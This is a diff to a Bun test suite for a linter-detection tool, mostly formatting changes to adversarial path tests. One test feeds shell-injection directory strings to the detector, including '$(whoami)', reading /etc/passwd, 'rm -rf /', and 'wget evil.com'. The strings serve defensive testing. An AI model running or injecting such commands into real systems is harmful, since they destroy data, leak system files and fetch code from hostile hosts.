@@ -1,9 +1,9 @@
-import { describe, it, expect, test } from 'bun:test';
+import { describe, expect, it, test } from 'bun:test';
 import * as path from 'node:path';
 import {
+	detectAvailableLinter,
 	getBiomeBinPath,
 	getEslintBinPath,
-	detectAvailableLinter,
 } from '../../../src/tools/lint';
 
 // ============================================================================
@@ -16,10 +16,8 @@ import {
 // ============================================================================
 
 describe('detectAvailableLinter() — ADVERSARIAL PATH & GUARD TESTS', () => {
-
 	// ============ getBiomeBinPath — returns string, no throw ============
 	describe('getBiomeBinPath() — path computation safety', () => {
-
 		it('ADV-001: should return a string (not null/undefined) for normal directory', () => {
 			const result = getBiomeBinPath('/project');
 			expect(typeof result).toBe('string');
@@ -158,7 +156,6 @@ describe('detectAvailableLinter() — ADVERSARIAL PATH & GUARD TESTS', () => {
 
 	// ============ getEslintBinPath — same guarantees ============
 	describe('getEslintBinPath() — path computation safety', () => {
-
 		it('ADV-018: should return a string for normal directory', () => {
 			const result = getEslintBinPath('/project');
 			expect(typeof result).toBe('string');
@@ -216,7 +213,6 @@ describe('detectAvailableLinter() — ADVERSARIAL PATH & GUARD TESTS', () => {
 
 	// ============ detectAvailableLinter() — graceful degradation ============
 	describe('detectAvailableLinter() — graceful handling of adversarial directory', () => {
-
 		it('ADV-026: path traversal ../../../etc — should not throw, return null', async () => {
 			// When directory doesn't contain a linter binary, detectAvailableLinter
 			// should gracefully return null (not throw)
@@ -308,24 +304,28 @@ describe('detectAvailableLinter() — ADVERSARIAL PATH & GUARD TESTS', () => {
 		// Bun's default per-test timeout is 5000ms, but 5 shell-metacharacter inputs
 		// each spawn npx processes that may take up to ~2s each (DETECT_TIMEOUT) × 2 procs.
 		// Set 30000ms so this test doesn't time out.
-		test('ADV-034: shell metacharacters in directory — should not throw', { timeout: 30000 }, async () => {
-			const inputs = [
-				'/path/$(whoami)',
-				'/path/`cat /etc/passwd`',
-				'/path;rm -rf /',
-				'/path&&wget evil.com',
-				'/path|wget evil.com',
-			];
-			for (const input of inputs) {
-				let threw = false;
-				try {
-					await detectAvailableLinter(input);
-				} catch {
-					threw = true;
+		test(
+			'ADV-034: shell metacharacters in directory — should not throw',
+			{ timeout: 30000 },
+			async () => {
+				const inputs = [
+					'/path/$(whoami)',
+					'/path/`cat /etc/passwd`',
+					'/path;rm -rf /',
+					'/path&&wget evil.com',
+					'/path|wget evil.com',
+				];
+				for (const input of inputs) {
+					let threw = false;
+					try {
+						await detectAvailableLinter(input);
+					} catch {
+						threw = true;
+					}
+					expect(threw).toBe(false);
 				}
-				expect(threw).toBe(false);
-			}
-		});
+			},
+		);
 
 		it('ADV-035: Unicode in directory — should not throw', async () => {
 			let threw = false;
@@ -408,7 +408,7 @@ describe('detectAvailableLinter() — ADVERSARIAL PATH & GUARD TESTS', () => {
 				'/path;rm',
 				'/path&&wget',
 				'/path||wget',
-				'/path'.repeat(100),   // 400 chars
+				'/path'.repeat(100), // 400 chars
 				'/project/' + 'a'.repeat(1000),
 				'/project/' + 'a'.repeat(10000),
 				'/path/node_modules',
